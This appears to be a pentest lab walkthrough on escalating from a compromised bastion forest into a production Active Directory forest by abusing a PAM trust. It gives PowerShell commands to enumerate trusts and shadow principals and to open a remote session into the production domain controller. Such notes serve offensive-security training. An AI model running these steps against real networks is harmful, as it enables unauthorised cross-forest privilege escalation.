# Cross Forest Attacks - Abusing PAM Trust

- [Cross Forest Attacks - Abusing PAM Trust](#cross-forest-attacks---abusing-pam-trust)
  - [PAM Trust](#pam-trust)
  - [Abusing PAM Trust](#abusing-pam-trust)

---

## PAM Trust

PAM trust is usually enabled between a **Bastion** or **Red forest** and a **production/user forest** which it manages.

PAM trust provides the ability to **access the production forest with high privileges without using credentials of the bastion forest**. Thus, better security for the bastion forest which is much desired.

To achieve the above, **Shadow Principals** are created in the bastion domain which are then **mapped to DA or EA groups SIDs in the production forest**.

Therefore, if the Bastion forest is compromised, the production forest will be compromised.

<br/>

We have DA access to the `techcorp.local` forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the `bastion.local` forest.

<br/>

## Abusing PAM Trust

From `techcorp-dc`:

```
Get-ADTrust -Filter *

Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

<br/>

On `bastion-dc`, enumerate if there is a PAM trust:

```
$bastiondc = New-PSSession bastion-dc.bastion.local

Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc
```

<br/>

Check which users are members of the Shadow Principals:

```
Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
```

<br/>

Establish a direct PSRemoting session on `bastion-dc` and access `production.local`:

```
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

<br/>

